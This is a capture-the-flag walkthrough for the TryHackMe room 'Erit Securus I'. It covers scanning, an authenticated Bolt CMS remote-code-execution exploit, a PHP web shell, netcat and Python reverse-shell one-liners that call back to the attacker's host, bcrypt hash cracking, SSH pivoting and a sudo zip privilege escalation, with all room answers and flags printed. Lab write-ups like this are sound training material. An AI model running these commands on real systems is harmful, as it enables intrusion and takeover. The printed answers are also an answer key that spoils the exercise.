# Erit Securus I

Learn to exploit the BoltCMS software by researching exploit-db.

[Erit Securus I](https://tryhackme.com/room/eritsecurusi)

## Topic's

- Network Enuemration
- Exploitation Bolt CMS 3.7.0
- SQL Enumeration
- Brute Forcing (Hash)
- Misconfigured Binaries (/usr/bin/zip)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Deploy box

Connect to network and deploy this machine. If you are unsure on how to get connected, complete the [OpenVPN room](https://tryhackme.com/room/openvpn) first.

Deploy box

`No answer needed`

## Task 2 Reconnaissance

We run a simple nmap scan. You can learn more here (https://tryhackme.com/room/vulnversity)

```
kali@kali:~/CTFs/tryhackme/Erit Securus I$ sudo nmap -A -sS -sC -sV -O 10.10.149.194
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-15 14:27 CET
Nmap scan report for 10.10.149.194
Host is up (0.033s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey:
|   1024 b1:ac:a9:92:d3:2a:69:91:68:b4:6a:ac:45:43:fb:ed (DSA)
|   2048 3a:3f:9f:59:29:c8:20:d7:3a:c5:04:aa:82:36:68:3f (RSA)
|   256 f9:2f:bb:e3:ab:95:ee:9e:78:7c:91:18:7d:95:84:ab (ECDSA)
|_  256 49:0e:6f:cb:ec:6c:a5:97:67:cc:3c:31:ad:94:a4:54 (ED25519)
80/tcp open  http    nginx 1.6.2
|_http-generator: Bolt
|_http-server-header: nginx/1.6.2
|_http-title: Graece donan, Latine voluptatem vocant. | Erit Securus 1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/15%OT=22%CT=1%CU=37378%PV=Y%DS=2%DC=T%G=Y%TM=5FB12C
OS:DE%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1
OS:1NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   32.81 ms 10.8.0.1
2   32.98 ms 10.10.149.194

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.30 seconds
```

How many ports are open?

`2`

What ports are open? Comma separated, lowest first: **,**

`22,80`

## Task 3 Webserver

Examine webserver. Identify what web-app is running.

What CMS is the website built on?

`© 2020 • This website is Built with Bolt. `

`Bolt`

## Task 4 Exploit

Download [exploit](https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py) for this app. The exploit works, but might not fire every time. If you first don't succeed...

In the exploit from 2020-04-05, what language is used to write the exploit?

`Python`

As the exploit is authenticated, you will also need a username and password. Knowing the URI for the login-portal is also critical for the exploit to work. Find the login-portal and try login in.

[User Manual / Login](https://docs.bolt.cm/3.6/manual/login)

[http://10.10.149.194/bolt/login](http://10.10.149.194/bolt/login)

`admin:password`

## Task 5 Reverse shell

`python3 exploit.py http://ip username password`

![](https://i.imgur.com/aVvruKT.png)

We can create a simple php-shell on the server, like this: `echo '<?php system($_GET["c"]);?>'>c.php` This we can use to upload a netcat reverse shell on the system and get a reverse shell, as there is no netcat on the box.

If you are using Kali Linux, the netcat installed supports the -e parameter (execute). Using this parameter we can start a shell upon connecting.

The e parameter is often removed from netcat in a lot of the Linux distributions, because it can be exploited to gain a shell. :-)

First we link the installed netcat to the current directory on our attacking machine:

`ln -s $(which nc) .`

Then we start a simple web server to serve some files, make sure the files you want to serve are in the current directory:

This will listen on port 8000 on you local machine: `python3 -m http.server 8000`

Using the c.php file we just dropped, we can browse to `http://serverip/files/cmd.php?c=wget http://yourip:8000/nc` to
download a linux netcat to the server, you will see in your web server if it has been retrieved:

This file is dropped in the same directory as our c.php. We make this nc executable like this: `http://serverip/files/cmd.php?c=chmod 755 nc`

Now start a netcat listener on your own machine, listening on a free port (we use 4444 here)

`ncat -nv -l -p 4444`

When it is uploaded and made executable, we can run it like this: `http://serverip/files/cmd.php?c=./nc -e /bin/bash yourip 4444`

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

If all goes well, you will see a connection coming in from the bolt server:
(Don’t forget to do the python pty dance, to make sure you have a shell with PTY’s allocated, some commands, especially sudo, require a PTY shell to run)

`python -c 'import pty;pty.spawn("/bin/bash")'`

What is the username of the user running the web server?

`www-data`

## Task 6 Priv esc

In the app/database directory you will find the bolt.db SQLite3 database

`file bolt.db` bolt.db: SQLite 3.x database, last written using SQLite version 3020001

Open database:

![](https://i.imgur.com/Fajrmfg.png)

This contains a lot of tables:

![](https://i.imgur.com/fcS9AJM.png)

We list the bolt user database, like this:

![](https://i.imgur.com/WV9wdwV.png)

We see two users, the admin we already own, the other one is a wild one. We also see another IP address, 192.168.100.1 (note to self)

We copy the hash and save it to a file. Then run it through john the ripper, using the infamous "[rockyou](https://en.wikipedia.org/wiki/RockYou) wordlist

`john hash -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt`

Using this password, we try to su as the user wileec. This works, and we should find our first flag.

```
www-data@Erit:/var/www/html/public/files$ cd /var/www/html/app/database
www-data@Erit:/var/www/html/app/database$ ls -la
total 328
drwxrwxrwx  2 root root   4096 Nov 15 23:33 .
drwxrwxrwx 16 root root   4096 Apr 25  2020 ..
-rwxrwxrwx  1 root root 327680 Nov 15 23:33 bolt.db
www-data@Erit:/var/www/html/app/database$ sqlite3 bolt.db
SQLite version 3.16.2 2017-01-06 16:32:41
Enter ".help" for usage hints.
sqlite> .tables
bolt_authtoken          bolt_field_value        bolt_pages
bolt_blocks             bolt_homepage           bolt_relations
bolt_content_changelog  bolt_log                bolt_showcases
bolt_cron               bolt_log_change         bolt_taxonomy
bolt_entries            bolt_log_system         bolt_users
sqlite> select * from bolt_users;
1|admin|$2y$10$C4b.yin4B2/2Q2uNT/Ns4.65A6LK6iUR/un3cViBvFWZs0mYtXXLK||0|a@a.com|2020-11-15 23:33:29|192.168.100.1|[]|1|||||["root","everyone"]
2|wildone|$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.|Wile E Coyote|0|wild@one.com|2020-04-25 16:03:44|192.168.100.1|[]|1|||||["editor"]
sqlite>
```

```
kali@kali:~/CTFs/tryhackme/Erit Securus I$ john wildone.hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
snickers         (?)
1g 0:00:00:03 DONE (2020-11-16 00:40) 0.2747g/s 138.4p/s 138.4c/s 138.4C/s pasaway..claire
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

`wildone:snickers`

```
www-data@Erit:/var/www/html/app/database$ su wileec
Password:
$ bash
wileec@Erit:/var/www/html/app/database$ cd ~
wileec@Erit:~$ ls -la
total 28
drwxr-xr-x 4 wileec wileec 4096 Apr 25  2020 .
drwxr-xr-x 4 root   root   4096 Apr 25  2020 ..
-rw-r--r-- 1 wileec wileec  220 May 15  2017 .bash_logout
-rw-r--r-- 1 wileec wileec 3526 May 15  2017 .bashrc
-rw-r--r-- 1 wileec wileec  675 May 15  2017 .profile
drwxr-xr-x 2 wileec wileec 4096 Apr 25  2020 .ssh
-rw-r--r-- 1 root   root     21 Apr 25  2020 flag1.txt
wileec@Erit:~$ cat flag1.txt
THM{Hey!_Welcome_in}
```

What is the users password?

`snickers`

Flag 1

`THM{Hey!_Welcome_in}`

## Task 7 Pivoting

User wileec has a ssh private-key!

```
wileec@Erit:~$ ls -lart .ssh/
-rw-r--r-- 1 wileec wileec  393 Apr 25 15:19 id_rsa.pub
-rw------- 1 wileec wileec 1675 Apr 25 15:19 id_rsa
-rw-r--r-- 1 wileec wileec  222 Apr 25 15:32 known_hosts
```

Remember the other IP address? We could try to connect to that one, using the SSH key:

`ssh wileec@192.168.100.1`

Remember: This has to be done from inside of the box, as this network is not available to you from the outside.

We can sudo!

If you look at [gtfobins](https://gtfobins.github.io/) we can see how we could leverage this.

The command is not going to work as it is, you must edit some parts.

```
wileec@Erit:~$ ls -lart .ssh/
total 20
-rw-r--r-- 1 wileec wileec  393 Apr 25  2020 id_rsa.pub
-rw------- 1 wileec wileec 1675 Apr 25  2020 id_rsa
-rw-r--r-- 1 wileec wileec  222 Apr 25  2020 known_hosts
drwxr-xr-x 2 wileec wileec 4096 Apr 25  2020 .
drwxr-xr-x 4 wileec wileec 4096 Apr 25  2020 ..
wileec@Erit:~$ ssh wileec@192.168.100.1

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Apr 25 12:36:02 2020 from 192.168.100.100
$ sudo -l
Matching Defaults entries for wileec on Securus:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User wileec may run the following commands on Securus:
    (jsmith) NOPASSWD: /usr/bin/zip
$
```

User wileec can sudo! What can he sudo?

`(jsmith) NOPASSWD: /usr/bin/zip`

## Task 8 Privesc #2

Using the sudo-trick, we’re now mr or mrs Smith (and admit, who does not want to be a Mr. or Mrs. Smith once in their life?), as an extra reward, there is flag 2 here.

```
$ TF=$(mktemp -u)
$ sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 32%)
$ sudo rm $TF
rm: missing operand
Try 'rm --help' for more information.
$ SHELL=/bin/bash script -q /dev/null
jsmith@Securus:/home/wileec$ cd ~
jsmith@Securus:~$ ls -la
total 24
drwxrwx--- 2 jsmith jsmith 4096 Apr 25  2020 .
drwxr-xr-x 4 root   root   4096 Apr 26  2020 ..
-rw-r--r-- 1 jsmith jsmith  220 Nov  5  2016 .bash_logout
-rw-r--r-- 1 jsmith jsmith 3515 Nov  5  2016 .bashrc
-rw-r--r-- 1 jsmith jsmith   33 Apr 25  2020 flag2.txt
-rw-r--r-- 1 jsmith jsmith  675 Nov  5  2016 .profile
jsmith@Securus:~$ cat flag2.txt
THM{Welcome_Home_Wile_E_Coyote!}
```

Flag 2

`THM{Welcome_Home_Wile_E_Coyote!}`

## Task 9 Root

As jsmith, we again check for sudo rights (this btw, should be your first action on any box when gaining access to a account)

There are several ways to exploit this rights. Go for it!

What sudo rights does jsmith have?

```
jsmith@Securus:~$ sudo -l
Matching Defaults entries for jsmith on Securus:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jsmith may run the following commands on Securus:
    (ALL : ALL) NOPASSWD: ALL
jsmith@Securus:~$ sudo -s
root@Securus:/home/jsmith# cd ~
root@Securus:~# ls -la
total 28
drwx------  4 root root 4096 Apr 26  2020 .
drwxr-xr-x 22 root root 4096 Apr 17  2020 ..
lrwxrwxrwx  1 root root    9 Apr 22  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root   43 Apr 25  2020 flag3.txt
drwx------  2 root root 4096 Apr 23  2020 .gnupg
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
drwx------  2 root root 4096 Apr 17  2020 .ssh
root@Securus:~# cat flag3.txt
THM{Great_work!_You_pwned_Erit_Securus_1!}
```

Flag 3

`THM{Great_work!_You_pwned_Erit_Securus_1!}`
